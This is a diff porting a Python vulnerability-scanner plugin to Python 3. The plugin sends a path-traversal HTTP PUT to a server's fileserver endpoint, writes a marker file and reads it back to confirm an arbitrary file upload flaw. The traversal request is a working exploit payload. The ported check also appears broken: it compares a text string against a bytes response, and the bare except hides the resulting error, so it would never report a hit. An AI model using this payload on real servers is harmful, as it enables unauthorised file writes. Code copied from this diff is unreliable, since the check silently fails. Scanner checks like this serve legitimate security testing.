@@ -1,7 +1,7 @@
 # coding:utf-8
 import socket
 import time
-import urllib2
+import requests
 import random
 
 def get_plugin_info():
@@ -30,12 +30,12 @@ def check(ip, port, timeout):
         s.connect((ip, port))
         filename = random_str(6)
         flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n"%(filename)
-        s.send(flag)
+        s.send(flag.encode("utf-8"))
         time.sleep(1)
         s.recv(1024)
         s.close()
         url = 'http://' + ip + ":" + str(port) + '/styles/%s.txt'%(filename)
-        res_html = urllib2.urlopen(url, timeout=timeout).read(1024)
+        res_html = requests.get(url,timeout=timeout).content
         if 'xxscan0' in res_html:
             return u"存在任意文件上传漏洞，" + url
     except:
